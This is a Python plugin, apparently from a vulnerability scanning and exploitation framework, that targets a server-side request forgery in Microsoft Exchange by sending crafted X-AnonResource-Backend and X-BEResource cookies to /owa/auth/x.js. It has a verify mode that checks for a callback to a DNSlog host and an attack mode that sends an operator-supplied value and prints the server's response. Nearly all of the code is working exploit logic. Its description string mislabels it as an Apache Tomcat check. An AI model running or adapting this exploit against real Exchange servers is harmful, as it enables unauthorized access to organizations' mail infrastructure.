from util.ExpRequest import ExpRequest, Output
from ClassCongregation import Dnslog
import util.globalvar as GlobalVar
"""
Exchange_SSRF  [ssrf]
"""
class Exchange():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')

    def Exchange_SSRF(self):
        appName = 'Exchange:Exchange_SSRF'
        pocname = 'Exchange_SSRF'
        path = '/owa/auth/x.js'
        method = 'get'
        desc = 'Apache Tomcat: Examples File'
        info = "[ssrf]"
        payload = ''
        cookie = 'X-AnonResource=true;X-AnonResource-Backend={}/ecp/default.flt?~3;X-BEResource={}/owa/auth/logon.aspx?~3;'
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            #_verify
            if self.vuln == 'False':
                dnslog = Dnslog()
                exprequest.get(self.url + path, data=payload, headers={'Cookie':cookie.format(dnslog.dns_host(), dnslog.dns_host())}, timeout=self.timeout, verify=False)
                if dnslog.result():
                    return output.echo_success(method, info)
                else:
                    return output.fail()
            #_attack
            else:
                request = exprequest.get(self.url + path, data=payload, headers={'Cookie':cookie.format(self.cmd, self.cmd)}, timeout=self.timeout, verify=False)
                print(request.text)
        except Exception as error:
                return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    ExpExchange = Exchange(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpExchange, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(Exchange):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpExchange, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)
